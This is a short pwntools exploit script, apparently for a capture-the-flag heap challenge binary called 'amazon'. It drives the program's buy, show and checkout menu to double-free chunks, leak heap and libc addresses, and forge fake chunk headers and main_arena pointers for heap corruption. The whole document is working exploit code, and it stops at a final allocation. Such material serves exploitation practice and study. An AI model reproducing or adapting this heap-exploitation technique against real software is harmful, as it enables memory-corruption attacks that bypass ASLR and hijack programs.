from pwn import *
context.log_level = 'debug'
def buy(item,number,size,data):
    p.sendlineafter("choice: ","1")
    p.sendlineafter("buy: ",str(item))
    p.sendlineafter("many: ",str(number))
    p.sendlineafter("note: ",str(size))
    p.sendafter("Content: ",data)


def show():
    p.sendlineafter("choice: ","2")


def checkout(idx):
    p.sendlineafter("choice: ","3")
    p.sendlineafter("for: ",str(idx))


def dbg():
    gdb.attach(p)


p = process('./amazon')

buy(0,0x10 , 0x80,"0"*8)
buy(1,0x10, 0x90, "1"*8)
buy(1,0x10,0x30,p64(0)+p64(0xa1)+"\n")
checkout(2)
buy(1,0x10,0x20,"\n")
for i in range(7):
    checkout(0)


show()
heap = u64(p.recv(12)[-6:].ljust(8,"\x00")) 
checkout(0)
show()
libc = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) -0x7ffff7dcfca0 + 0x00007ffff79e4000


buy(1,0x10,0x30,"y"*0x10+p64(0)+p64(0x81)+p64(libc+0x00007ffff7dcfcf0-0x7ffff79e4000)*2)
buy(2,0x10,0x80,"2"*8)
payload = p64(libc+0x00007ffff7dcfcb0-0x00007ffff79e4000)*2
payload += p64(libc+0x00007ffff7dcfcc0-0x7ffff79e4000)*2
payload +=  p64(libc+0x00007ffff7dcfcd0-0x7ffff79e4000)*2
payload += p64(heap + 0x1a0)*2

buy(3,0x10 , 0x80,payload+"\n")
buy(1,0x10,0x58,"\n")

